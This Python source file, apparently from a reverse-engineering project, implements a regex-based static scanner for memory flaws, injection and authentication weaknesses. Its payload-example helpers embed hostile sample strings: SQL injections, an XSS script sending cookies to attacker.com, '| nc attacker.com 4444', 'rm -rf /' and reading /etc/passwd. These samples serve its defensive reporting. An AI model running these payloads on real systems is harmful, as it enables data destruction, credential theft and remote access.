#!/usr/bin/env python3
"""
Vulnerability Discovery Engine
=============================

Automated vulnerability discovery engine for memory vulnerabilities, injection flaws,
and authentication bypasses across multiple programming languages and binary formats.

Author: REVENG Project - AI Enhancement Module
Version: 1.0
"""

import re
import ast
import logging
from typing import List, Dict, Any, Optional, Tuple, Set
from dataclasses import dataclass
from pathlib import Path

try:
    from .ai_enhanced_data_models import (
        MemoryVulnerability, InjectionVulnerability, AuthenticationIssue,
        CryptographicWeakness, VulnerabilityReport, Evidence, Severity,
        EvidenceTracker
    )
except ImportError:
    from ai_enhanced_data_models import (
        MemoryVulnerability, InjectionVulnerability, AuthenticationIssue,
        CryptographicWeakness, VulnerabilityReport, Evidence, Severity,
        EvidenceTracker
    )


class MemoryVulnerabilityScanner:
    """Scanner for memory-related vulnerabilities in C/C++ code"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.evidence_tracker = EvidenceTracker()
        
        # Dangerous functions that can cause buffer overflows
        self.dangerous_functions = {
            'strcpy': {'severity': Severity.HIGH, 'type': 'buffer_overflow'},
            'strcat': {'severity': Severity.HIGH, 'type': 'buffer_overflow'},
            'sprintf': {'severity': Severity.HIGH, 'type': 'buffer_overflow'},
            'gets': {'severity': Severity.CRITICAL, 'type': 'buffer_overflow'},
            'scanf': {'severity': Severity.MEDIUM, 'type': 'buffer_overflow'},
            'strncpy': {'severity': Severity.MEDIUM, 'type': 'potential_overflow'},
            'strncat': {'severity': Severity.MEDIUM, 'type': 'potential_overflow'},
            'snprintf': {'severity': Severity.LOW, 'type': 'potential_overflow'},
            'memcpy': {'severity': Severity.MEDIUM, 'type': 'buffer_overflow'},
            'memmove': {'severity': Severity.MEDIUM, 'type': 'buffer_overflow'},
            'alloca': {'severity': Severity.MEDIUM, 'type': 'stack_overflow'},
        }
        
        # Memory management patterns
        self.memory_patterns = {
            'malloc_without_free': r'malloc\s*\([^)]+\)(?!.*free\s*\()',
            'double_free': r'free\s*\([^)]+\).*free\s*\([^)]+\)',
            'use_after_free': r'free\s*\(([^)]+)\).*\1',
            'null_deref': r'(\w+)\s*=\s*NULL.*\*\1',
            'uninitialized_var': r'(\w+)\s*;.*\*\1',
        }
    
    def scan_code(self, code: str, file_path: str = "") -> List[MemoryVulnerability]:
        """Scan code for memory vulnerabilities"""
        vulnerabilities = []
        
        # Scan for dangerous function usage
        vulnerabilities.extend(self._scan_dangerous_functions(code, file_path))
        
        # Scan for memory management issues
        vulnerabilities.extend(self._scan_memory_patterns(code, file_path))
        
        # Scan for buffer overflow patterns
        vulnerabilities.extend(self._scan_buffer_overflows(code, file_path))
        
        # Scan for use-after-free and double-free
        vulnerabilities.extend(self._scan_memory_lifecycle(code, file_path))
        
        return vulnerabilities
    
    def _scan_dangerous_functions(self, code: str, file_path: str) -> List[MemoryVulnerability]:
        """Scan for usage of dangerous functions"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for func_name, func_info in self.dangerous_functions.items():
                pattern = rf'\b{func_name}\s*\('
                if re.search(pattern, line):
                    # Create evidence
                    evidence = self.evidence_tracker.add_evidence(
                        "dangerous_function_usage",
                        f"Usage of dangerous function '{func_name}' detected",
                        "static_analysis",
                        0.8,
                        {"line_number": line_num, "function": func_name, "code_line": line.strip()}
                    )
                    
                    vuln = MemoryVulnerability(
                        type=func_info['type'],
                        location=f"{file_path}:{line_num}",
                        function=func_name,
                        severity=func_info['severity'],
                        description=f"Dangerous function '{func_name}' used without proper bounds checking",
                        exploit_potential=self._assess_exploit_potential(func_name, line),
                        remediation=self._get_remediation_advice(func_name),
                        confidence=0.8,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_memory_patterns(self, code: str, file_path: str) -> List[MemoryVulnerability]:
        """Scan for memory management patterns"""
        vulnerabilities = []
        
        for pattern_name, pattern in self.memory_patterns.items():
            matches = re.finditer(pattern, code, re.MULTILINE | re.DOTALL)
            
            for match in matches:
                line_num = code[:match.start()].count('\n') + 1
                
                evidence = self.evidence_tracker.add_evidence(
                    "memory_pattern",
                    f"Memory management issue pattern '{pattern_name}' detected",
                    "pattern_matching",
                    0.7,
                    {"line_number": line_num, "pattern": pattern_name, "match": match.group()}
                )
                
                vuln = MemoryVulnerability(
                    type=pattern_name,
                    location=f"{file_path}:{line_num}",
                    function="unknown",
                    severity=self._get_pattern_severity(pattern_name),
                    description=f"Memory management issue: {pattern_name}",
                    exploit_potential=self._assess_pattern_exploit_potential(pattern_name),
                    remediation=self._get_pattern_remediation(pattern_name),
                    confidence=0.7,
                    evidence=[evidence]
                )
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_buffer_overflows(self, code: str, file_path: str) -> List[MemoryVulnerability]:
        """Scan for potential buffer overflow conditions"""
        vulnerabilities = []
        lines = code.split('\n')
        
        # Look for array declarations and usage
        array_pattern = r'(\w+)\s*\[\s*(\d+)\s*\]'
        loop_pattern = r'for\s*\([^)]*(\w+)[^)]*<[^)]*(\w+)[^)]*\)'
        
        arrays = {}
        for line_num, line in enumerate(lines, 1):
            # Find array declarations
            array_matches = re.finditer(array_pattern, line)
            for match in array_matches:
                array_name = match.group(1)
                array_size = int(match.group(2))
                arrays[array_name] = {'size': array_size, 'line': line_num}
            
            # Check for potential overflows in loops
            loop_matches = re.finditer(loop_pattern, line)
            for match in loop_matches:
                loop_var = match.group(1)
                limit_var = match.group(2)
                
                # Check if loop accesses arrays without bounds checking
                if any(f'{array_name}[{loop_var}]' in line for array_name in arrays):
                    evidence = self.evidence_tracker.add_evidence(
                        "potential_buffer_overflow",
                        f"Loop variable '{loop_var}' used to access array without bounds checking",
                        "control_flow_analysis",
                        0.6,
                        {"line_number": line_num, "loop_var": loop_var, "code_line": line.strip()}
                    )
                    
                    vuln = MemoryVulnerability(
                        type="potential_buffer_overflow",
                        location=f"{file_path}:{line_num}",
                        function="unknown",
                        severity=Severity.MEDIUM,
                        description=f"Potential buffer overflow in loop accessing array with variable '{loop_var}'",
                        exploit_potential="Medium - depends on input validation",
                        remediation="Add bounds checking before array access",
                        confidence=0.6,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_memory_lifecycle(self, code: str, file_path: str) -> List[MemoryVulnerability]:
        """Scan for use-after-free and double-free vulnerabilities"""
        vulnerabilities = []
        
        # Track malloc/free pairs
        malloc_pattern = r'(\w+)\s*=\s*malloc\s*\('
        free_pattern = r'free\s*\(\s*(\w+)\s*\)'
        usage_pattern = r'\*(\w+)|(\w+)\s*\['
        
        allocated_vars = {}
        freed_vars = set()
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            # Track allocations
            malloc_matches = re.finditer(malloc_pattern, line)
            for match in malloc_matches:
                var_name = match.group(1)
                allocated_vars[var_name] = line_num
            
            # Track frees
            free_matches = re.finditer(free_pattern, line)
            for match in free_matches:
                var_name = match.group(1)
                if var_name in freed_vars:
                    # Double free detected
                    evidence = self.evidence_tracker.add_evidence(
                        "double_free",
                        f"Double free of variable '{var_name}' detected",
                        "memory_lifecycle_analysis",
                        0.9,
                        {"line_number": line_num, "variable": var_name, "code_line": line.strip()}
                    )
                    
                    vuln = MemoryVulnerability(
                        type="double_free",
                        location=f"{file_path}:{line_num}",
                        function="unknown",
                        severity=Severity.HIGH,
                        description=f"Double free of variable '{var_name}'",
                        exploit_potential="High - can lead to heap corruption",
                        remediation="Set pointer to NULL after free, check for NULL before free",
                        confidence=0.9,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
                
                freed_vars.add(var_name)
            
            # Check for use after free
            usage_matches = re.finditer(usage_pattern, line)
            for match in usage_matches:
                var_name = match.group(1) or match.group(2)
                if var_name in freed_vars:
                    evidence = self.evidence_tracker.add_evidence(
                        "use_after_free",
                        f"Use after free of variable '{var_name}' detected",
                        "memory_lifecycle_analysis",
                        0.8,
                        {"line_number": line_num, "variable": var_name, "code_line": line.strip()}
                    )
                    
                    vuln = MemoryVulnerability(
                        type="use_after_free",
                        location=f"{file_path}:{line_num}",
                        function="unknown",
                        severity=Severity.HIGH,
                        description=f"Use after free of variable '{var_name}'",
                        exploit_potential="High - can lead to arbitrary code execution",
                        remediation="Set pointer to NULL after free, check for NULL before use",
                        confidence=0.8,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _assess_exploit_potential(self, func_name: str, code_line: str) -> str:
        """Assess exploit potential for dangerous function usage"""
        if func_name in ['gets', 'strcpy', 'strcat']:
            return "High - direct buffer overflow possible"
        elif func_name in ['sprintf', 'scanf']:
            return "High - format string or buffer overflow possible"
        elif func_name in ['memcpy', 'memmove']:
            return "Medium - depends on size parameter validation"
        else:
            return "Medium - potential overflow with malicious input"
    
    def _get_remediation_advice(self, func_name: str) -> str:
        """Get remediation advice for dangerous functions"""
        remediation_map = {
            'strcpy': 'Use strncpy() or strlcpy() with proper size limits',
            'strcat': 'Use strncat() or strlcat() with proper size limits',
            'sprintf': 'Use snprintf() with buffer size parameter',
            'gets': 'Use fgets() with buffer size parameter',
            'scanf': 'Use format specifiers with width limits (e.g., %10s)',
            'memcpy': 'Validate size parameter against buffer bounds',
            'memmove': 'Validate size parameter against buffer bounds',
            'alloca': 'Use malloc() with proper error checking and free()',
        }
        return remediation_map.get(func_name, 'Review function usage for potential buffer overflows')
    
    def _get_pattern_severity(self, pattern_name: str) -> Severity:
        """Get severity for memory patterns"""
        severity_map = {
            'malloc_without_free': Severity.MEDIUM,
            'double_free': Severity.HIGH,
            'use_after_free': Severity.HIGH,
            'null_deref': Severity.MEDIUM,
            'uninitialized_var': Severity.MEDIUM,
        }
        return severity_map.get(pattern_name, Severity.LOW)
    
    def _assess_pattern_exploit_potential(self, pattern_name: str) -> str:
        """Assess exploit potential for memory patterns"""
        potential_map = {
            'malloc_without_free': 'Low - memory leak, DoS potential',
            'double_free': 'High - heap corruption, arbitrary code execution',
            'use_after_free': 'High - heap corruption, arbitrary code execution',
            'null_deref': 'Medium - application crash, DoS',
            'uninitialized_var': 'Medium - information disclosure, unpredictable behavior',
        }
        return potential_map.get(pattern_name, 'Unknown')
    
    def _get_pattern_remediation(self, pattern_name: str) -> str:
        """Get remediation advice for memory patterns"""
        remediation_map = {
            'malloc_without_free': 'Ensure every malloc() has a corresponding free()',
            'double_free': 'Set pointer to NULL after free(), check for NULL before free()',
            'use_after_free': 'Set pointer to NULL after free(), avoid using freed pointers',
            'null_deref': 'Check for NULL before dereferencing pointers',
            'uninitialized_var': 'Initialize variables before use',
        }
        return remediation_map.get(pattern_name, 'Review memory management practices')


class InjectionVulnerabilityScanner:
    """Scanner for injection vulnerabilities (SQL, XSS, Command)"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.evidence_tracker = EvidenceTracker()
        
        # SQL injection patterns
        self.sql_patterns = {
            'dynamic_query': r'(SELECT|INSERT|UPDATE|DELETE).*\+.*\w+',
            'string_concat': r'(query|sql)\s*=.*\+.*\w+',
            'format_string': r'(query|sql)\s*=.*%[sd]',
            'execute_immediate': r'execute\s*\(.*\+.*\w+\)',
        }
        
        # XSS patterns
        self.xss_patterns = {
            'innerHTML': r'innerHTML\s*=.*\w+',
            'document_write': r'document\.write\s*\(.*\w+.*\)',
            'eval_user_input': r'eval\s*\(.*\w+.*\)',
            'unescaped_output': r'(echo|print|printf)\s*\(.*\$\w+.*\)',
        }
        
        # Command injection patterns
        self.command_patterns = {
            'system_call': r'(system|exec|popen|shell_exec)\s*\(.*\w+.*\)',
            'backticks': r'`.*\$\w+.*`',
            'pipe_input': r'\|\s*\w+',
            'eval_command': r'eval\s*\(.*\w+.*\)',
        }
    
    def scan_code(self, code: str, file_path: str = "", language: str = "unknown") -> List[InjectionVulnerability]:
        """Scan code for injection vulnerabilities"""
        vulnerabilities = []
        
        # Scan for SQL injection
        vulnerabilities.extend(self._scan_sql_injection(code, file_path, language))
        
        # Scan for XSS
        vulnerabilities.extend(self._scan_xss(code, file_path, language))
        
        # Scan for command injection
        vulnerabilities.extend(self._scan_command_injection(code, file_path, language))
        
        return vulnerabilities
    
    def _scan_sql_injection(self, code: str, file_path: str, language: str) -> List[InjectionVulnerability]:
        """Scan for SQL injection vulnerabilities"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.sql_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    # Check if parameterized queries are used
                    if self._has_parameterized_query(line):
                        continue
                    
                    evidence = self.evidence_tracker.add_evidence(
                        "sql_injection_pattern",
                        f"SQL injection pattern '{pattern_name}' detected",
                        "pattern_matching",
                        0.7,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = InjectionVulnerability(
                        type="sql_injection",
                        location=f"{file_path}:{line_num}",
                        parameter=self._extract_parameter(match.group()),
                        severity=Severity.HIGH,
                        description=f"Potential SQL injection via dynamic query construction",
                        payload_example=self._generate_sql_payload_example(pattern_name),
                        remediation="Use parameterized queries or prepared statements",
                        confidence=0.7,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_xss(self, code: str, file_path: str, language: str) -> List[InjectionVulnerability]:
        """Scan for XSS vulnerabilities"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.xss_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    # Check if output is escaped
                    if self._has_output_escaping(line):
                        continue
                    
                    evidence = self.evidence_tracker.add_evidence(
                        "xss_pattern",
                        f"XSS pattern '{pattern_name}' detected",
                        "pattern_matching",
                        0.6,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = InjectionVulnerability(
                        type="xss",
                        location=f"{file_path}:{line_num}",
                        parameter=self._extract_parameter(match.group()),
                        severity=Severity.MEDIUM,
                        description=f"Potential XSS via unescaped output",
                        payload_example=self._generate_xss_payload_example(pattern_name),
                        remediation="Escape output or use safe templating functions",
                        confidence=0.6,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_command_injection(self, code: str, file_path: str, language: str) -> List[InjectionVulnerability]:
        """Scan for command injection vulnerabilities"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.command_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    # Check if input is sanitized
                    if self._has_input_sanitization(line):
                        continue
                    
                    evidence = self.evidence_tracker.add_evidence(
                        "command_injection_pattern",
                        f"Command injection pattern '{pattern_name}' detected",
                        "pattern_matching",
                        0.8,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = InjectionVulnerability(
                        type="command_injection",
                        location=f"{file_path}:{line_num}",
                        parameter=self._extract_parameter(match.group()),
                        severity=Severity.CRITICAL,
                        description=f"Potential command injection via system call",
                        payload_example=self._generate_command_payload_example(pattern_name),
                        remediation="Sanitize input, use safe APIs, avoid system calls with user input",
                        confidence=0.8,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _has_parameterized_query(self, line: str) -> bool:
        """Check if line uses parameterized queries"""
        parameterized_indicators = ['?', ':param', '@param', 'prepare', 'bind']
        return any(indicator in line.lower() for indicator in parameterized_indicators)
    
    def _has_output_escaping(self, line: str) -> bool:
        """Check if output is escaped"""
        escape_functions = ['htmlspecialchars', 'htmlentities', 'escape', 'sanitize']
        return any(func in line.lower() for func in escape_functions)
    
    def _has_input_sanitization(self, line: str) -> bool:
        """Check if input is sanitized"""
        sanitize_functions = ['sanitize', 'validate', 'filter', 'escape']
        return any(func in line.lower() for func in sanitize_functions)
    
    def _extract_parameter(self, match_text: str) -> str:
        """Extract parameter name from match"""
        # Simple extraction - look for variable names
        var_match = re.search(r'\$?(\w+)', match_text)
        return var_match.group(1) if var_match else "unknown"
    
    def _generate_sql_payload_example(self, pattern_name: str) -> str:
        """Generate SQL injection payload example"""
        examples = {
            'dynamic_query': "'; DROP TABLE users; --",
            'string_concat': "' OR '1'='1",
            'format_string': "'; UNION SELECT password FROM users; --",
            'execute_immediate': "'; INSERT INTO admin VALUES ('attacker'); --",
        }
        return examples.get(pattern_name, "' OR 1=1 --")
    
    def _generate_xss_payload_example(self, pattern_name: str) -> str:
        """Generate XSS payload example"""
        examples = {
            'innerHTML': "<script>alert('XSS')</script>",
            'document_write': "<img src=x onerror=alert('XSS')>",
            'eval_user_input': "alert('XSS')",
            'unescaped_output': "<script>document.location='http://attacker.com/'+document.cookie</script>",
        }
        return examples.get(pattern_name, "<script>alert('XSS')</script>")
    
    def _generate_command_payload_example(self, pattern_name: str) -> str:
        """Generate command injection payload example"""
        examples = {
            'system_call': "; cat /etc/passwd",
            'backticks': "`rm -rf /`",
            'pipe_input': "| nc attacker.com 4444",
            'eval_command': "system('rm -rf /')",
        }
        return examples.get(pattern_name, "; rm -rf /")


class AuthenticationBypassScanner:
    """Scanner for authentication and authorization bypass vulnerabilities"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.evidence_tracker = EvidenceTracker()
        
        # Authentication bypass patterns
        self.auth_patterns = {
            'hardcoded_credentials': r'(password|pwd|pass)\s*=\s*["\'][\w\d]+["\']',
            'weak_comparison': r'(password|token)\s*==\s*["\'][\w\d]*["\']',
            'empty_password': r'(password|pwd)\s*==\s*["\']["\']',
            'admin_backdoor': r'(user|username)\s*==\s*["\']admin["\']',
            'bypass_condition': r'if\s*\(\s*false\s*\)|if\s*\(\s*0\s*\)',
        }
        
        # Weak crypto patterns
        self.crypto_patterns = {
            'md5_hash': r'md5\s*\(',
            'sha1_hash': r'sha1\s*\(',
            'weak_random': r'rand\s*\(\s*\)|random\s*\(\s*\)',
            'hardcoded_key': r'(key|secret)\s*=\s*["\'][\w\d]+["\']',
            'no_salt': r'hash\s*\(\s*password\s*\)',
        }
        
        # Session management patterns
        self.session_patterns = {
            'predictable_session': r'session_id\s*=\s*\d+',
            'no_session_timeout': r'session_start\s*\(',
            'session_fixation': r'session_id\s*=\s*\$_GET',
            'weak_session_gen': r'session_id\s*=\s*time\s*\(',
        }
    
    def scan_code(self, code: str, file_path: str = "", language: str = "unknown") -> List[AuthenticationIssue]:
        """Scan code for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Scan for authentication bypasses
        vulnerabilities.extend(self._scan_auth_bypasses(code, file_path, language))
        
        # Scan for weak cryptography
        vulnerabilities.extend(self._scan_weak_crypto(code, file_path, language))
        
        # Scan for session management issues
        vulnerabilities.extend(self._scan_session_issues(code, file_path, language))
        
        return vulnerabilities
    
    def _scan_auth_bypasses(self, code: str, file_path: str, language: str) -> List[AuthenticationIssue]:
        """Scan for authentication bypass patterns"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.auth_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    evidence = self.evidence_tracker.add_evidence(
                        "auth_bypass_pattern",
                        f"Authentication bypass pattern '{pattern_name}' detected",
                        "pattern_matching",
                        0.8,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = AuthenticationIssue(
                        type=pattern_name,
                        location=f"{file_path}:{line_num}",
                        severity=self._get_auth_severity(pattern_name),
                        description=f"Authentication bypass vulnerability: {pattern_name}",
                        bypass_method=self._get_bypass_method(pattern_name),
                        remediation=self._get_auth_remediation(pattern_name),
                        confidence=0.8,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_weak_crypto(self, code: str, file_path: str, language: str) -> List[AuthenticationIssue]:
        """Scan for weak cryptographic implementations"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.crypto_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    evidence = self.evidence_tracker.add_evidence(
                        "weak_crypto_pattern",
                        f"Weak cryptography pattern '{pattern_name}' detected",
                        "pattern_matching",
                        0.7,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = AuthenticationIssue(
                        type="weak_cryptography",
                        location=f"{file_path}:{line_num}",
                        severity=self._get_crypto_severity(pattern_name),
                        description=f"Weak cryptographic implementation: {pattern_name}",
                        bypass_method=self._get_crypto_weakness(pattern_name),
                        remediation=self._get_crypto_remediation(pattern_name),
                        confidence=0.7,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _scan_session_issues(self, code: str, file_path: str, language: str) -> List[AuthenticationIssue]:
        """Scan for session management vulnerabilities"""
        vulnerabilities = []
        lines = code.split('\n')
        
        for line_num, line in enumerate(lines, 1):
            for pattern_name, pattern in self.session_patterns.items():
                matches = re.finditer(pattern, line, re.IGNORECASE)
                
                for match in matches:
                    evidence = self.evidence_tracker.add_evidence(
                        "session_issue_pattern",
                        f"Session management issue '{pattern_name}' detected",
                        "pattern_matching",
                        0.6,
                        {"line_number": line_num, "pattern": pattern_name, "code_line": line.strip()}
                    )
                    
                    vuln = AuthenticationIssue(
                        type="session_management",
                        location=f"{file_path}:{line_num}",
                        severity=self._get_session_severity(pattern_name),
                        description=f"Session management vulnerability: {pattern_name}",
                        bypass_method=self._get_session_weakness(pattern_name),
                        remediation=self._get_session_remediation(pattern_name),
                        confidence=0.6,
                        evidence=[evidence]
                    )
                    vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _get_auth_severity(self, pattern_name: str) -> Severity:
        """Get severity for authentication patterns"""
        severity_map = {
            'hardcoded_credentials': Severity.CRITICAL,
            'weak_comparison': Severity.HIGH,
            'empty_password': Severity.CRITICAL,
            'admin_backdoor': Severity.CRITICAL,
            'bypass_condition': Severity.HIGH,
        }
        return severity_map.get(pattern_name, Severity.MEDIUM)
    
    def _get_bypass_method(self, pattern_name: str) -> str:
        """Get bypass method for authentication patterns"""
        methods = {
            'hardcoded_credentials': 'Use hardcoded credentials found in source code',
            'weak_comparison': 'Exploit weak string comparison logic',
            'empty_password': 'Login with empty password',
            'admin_backdoor': 'Use admin username to bypass authentication',
            'bypass_condition': 'Exploit always-false condition in authentication logic',
        }
        return methods.get(pattern_name, 'Unknown bypass method')
    
    def _get_auth_remediation(self, pattern_name: str) -> str:
        """Get remediation for authentication patterns"""
        remediation = {
            'hardcoded_credentials': 'Remove hardcoded credentials, use secure credential storage',
            'weak_comparison': 'Use secure comparison functions, implement proper validation',
            'empty_password': 'Enforce password requirements, validate input',
            'admin_backdoor': 'Remove backdoor accounts, implement proper access controls',
            'bypass_condition': 'Fix authentication logic, remove debug code',
        }
        return remediation.get(pattern_name, 'Review authentication implementation')
    
    def _get_crypto_severity(self, pattern_name: str) -> Severity:
        """Get severity for crypto patterns"""
        severity_map = {
            'md5_hash': Severity.HIGH,
            'sha1_hash': Severity.MEDIUM,
            'weak_random': Severity.MEDIUM,
            'hardcoded_key': Severity.CRITICAL,
            'no_salt': Severity.HIGH,
        }
        return severity_map.get(pattern_name, Severity.MEDIUM)
    
    def _get_crypto_weakness(self, pattern_name: str) -> str:
        """Get crypto weakness description"""
        weaknesses = {
            'md5_hash': 'MD5 is cryptographically broken and vulnerable to collision attacks',
            'sha1_hash': 'SHA1 is deprecated and vulnerable to collision attacks',
            'weak_random': 'Weak random number generation can be predicted',
            'hardcoded_key': 'Hardcoded cryptographic keys can be extracted from binaries',
            'no_salt': 'Unsalted hashes are vulnerable to rainbow table attacks',
        }
        return weaknesses.get(pattern_name, 'Weak cryptographic implementation')
    
    def _get_crypto_remediation(self, pattern_name: str) -> str:
        """Get crypto remediation advice"""
        remediation = {
            'md5_hash': 'Use SHA-256 or stronger hash functions',
            'sha1_hash': 'Use SHA-256 or stronger hash functions',
            'weak_random': 'Use cryptographically secure random number generators',
            'hardcoded_key': 'Use secure key management systems, generate keys at runtime',
            'no_salt': 'Use unique salts for each password hash',
        }
        return remediation.get(pattern_name, 'Review cryptographic implementation')
    
    def _get_session_severity(self, pattern_name: str) -> Severity:
        """Get severity for session patterns"""
        severity_map = {
            'predictable_session': Severity.HIGH,
            'no_session_timeout': Severity.MEDIUM,
            'session_fixation': Severity.HIGH,
            'weak_session_gen': Severity.HIGH,
        }
        return severity_map.get(pattern_name, Severity.MEDIUM)
    
    def _get_session_weakness(self, pattern_name: str) -> str:
        """Get session weakness description"""
        weaknesses = {
            'predictable_session': 'Predictable session IDs can be guessed by attackers',
            'no_session_timeout': 'Sessions without timeout remain valid indefinitely',
            'session_fixation': 'Session ID from GET parameter enables session fixation attacks',
            'weak_session_gen': 'Time-based session generation is predictable',
        }
        return weaknesses.get(pattern_name, 'Session management weakness')
    
    def _get_session_remediation(self, pattern_name: str) -> str:
        """Get session remediation advice"""
        remediation = {
            'predictable_session': 'Use cryptographically secure random session ID generation',
            'no_session_timeout': 'Implement session timeout and idle timeout',
            'session_fixation': 'Regenerate session ID after authentication',
            'weak_session_gen': 'Use secure random number generators for session IDs',
        }
        return remediation.get(pattern_name, 'Review session management implementation')


class VulnerabilityDiscoveryEngine:
    """Main vulnerability discovery engine coordinating all scanners"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.memory_scanner = MemoryVulnerabilityScanner()
        self.injection_scanner = InjectionVulnerabilityScanner()
        self.auth_scanner = AuthenticationBypassScanner()
        self.evidence_tracker = EvidenceTracker()
    
    def analyze_code(self, code: str, file_path: str = "", language: str = "unknown") -> VulnerabilityReport:
        """Analyze code for all types of vulnerabilities"""
        self.logger.info(f"Starting vulnerability analysis for {file_path}")
        
        # Initialize report
        report = VulnerabilityReport()
        
        try:
            # Scan for memory vulnerabilities (primarily C/C++)
            if language.lower() in ['c', 'cpp', 'c++', 'native']:
                memory_vulns = self.memory_scanner.scan_code(code, file_path)
                report.memory_vulnerabilities = memory_vulns
                self.logger.info(f"Found {len(memory_vulns)} memory vulnerabilities")
            
            # Scan for injection vulnerabilities (all languages)
            injection_vulns = self.injection_scanner.scan_code(code, file_path, language)
            report.injection_vulnerabilities = injection_vulns
            self.logger.info(f"Found {len(injection_vulns)} injection vulnerabilities")
            
            # Scan for authentication issues (all languages)
            auth_issues = self.auth_scanner.scan_code(code, file_path, language)
            report.authentication_issues = auth_issues
            self.logger.info(f"Found {len(auth_issues)} authentication issues")
            
            # Calculate statistics
            self._calculate_report_statistics(report)
            
            # Generate summary
            report.summary = self._generate_summary(report)
            report.confidence_score = self._calculate_overall_confidence(report)
            
            self.logger.info(f"Vulnerability analysis completed. Total vulnerabilities: {report.total_vulnerabilities}")
            
        except Exception as e:
            self.logger.error(f"Error during vulnerability analysis: {str(e)}")
            report.summary = f"Analysis failed: {str(e)}"
        
        return report
    
    def analyze_file(self, file_path: str, language: str = "unknown") -> VulnerabilityReport:
        """Analyze a file for vulnerabilities"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                code = f.read()
            return self.analyze_code(code, file_path, language)
        except Exception as e:
            self.logger.error(f"Error reading file {file_path}: {str(e)}")
            report = VulnerabilityReport()
            report.summary = f"Failed to read file: {str(e)}"
            return report
    
    def _calculate_report_statistics(self, report: VulnerabilityReport):
        """Calculate vulnerability statistics"""
        all_vulns = (
            report.memory_vulnerabilities +
            report.injection_vulnerabilities +
            report.authentication_issues +
            report.cryptographic_weaknesses
        )
        
        report.total_vulnerabilities = len(all_vulns)
        
        # Count by severity
        severity_counts = {
            'CRITICAL': 0,
            'HIGH': 0,
            'MEDIUM': 0,
            'LOW': 0,
            'INFO': 0
        }
        
        for vuln in all_vulns:
            severity = vuln.severity.value
            severity_counts[severity] += 1
        
        report.critical_count = severity_counts['CRITICAL']
        report.high_count = severity_counts['HIGH']
        report.medium_count = severity_counts['MEDIUM']
        report.low_count = severity_counts['LOW']
        report.info_count = severity_counts['INFO']
        
        report.severity_distribution = severity_counts
        
        # Assess exploit potential
        if report.critical_count > 0:
            report.exploit_potential = "Critical - Immediate exploitation possible"
        elif report.high_count > 0:
            report.exploit_potential = "High - Exploitation likely with moderate effort"
        elif report.medium_count > 0:
            report.exploit_potential = "Medium - Exploitation possible with significant effort"
        else:
            report.exploit_potential = "Low - Limited exploitation potential"
        
        # Generate remediation priorities
        priorities = []
        if report.critical_count > 0:
            priorities.append("Address critical vulnerabilities immediately")
        if report.high_count > 0:
            priorities.append("Fix high-severity vulnerabilities within 24-48 hours")
        if report.medium_count > 0:
            priorities.append("Plan remediation for medium-severity issues")
        
        report.remediation_priority = priorities
    
    def _generate_summary(self, report: VulnerabilityReport) -> str:
        """Generate vulnerability report summary"""
        if report.total_vulnerabilities == 0:
            return "No vulnerabilities detected in the analyzed code."
        
        summary_parts = [
            f"Vulnerability analysis identified {report.total_vulnerabilities} potential security issues:"
        ]
        
        if report.critical_count > 0:
            summary_parts.append(f"- {report.critical_count} CRITICAL vulnerabilities requiring immediate attention")
        
        if report.high_count > 0:
            summary_parts.append(f"- {report.high_count} HIGH severity vulnerabilities")
        
        if report.medium_count > 0:
            summary_parts.append(f"- {report.medium_count} MEDIUM severity vulnerabilities")
        
        if report.low_count > 0:
            summary_parts.append(f"- {report.low_count} LOW severity vulnerabilities")
        
        # Add specific vulnerability type counts
        type_counts = []
        if report.memory_vulnerabilities:
            type_counts.append(f"{len(report.memory_vulnerabilities)} memory-related")
        if report.injection_vulnerabilities:
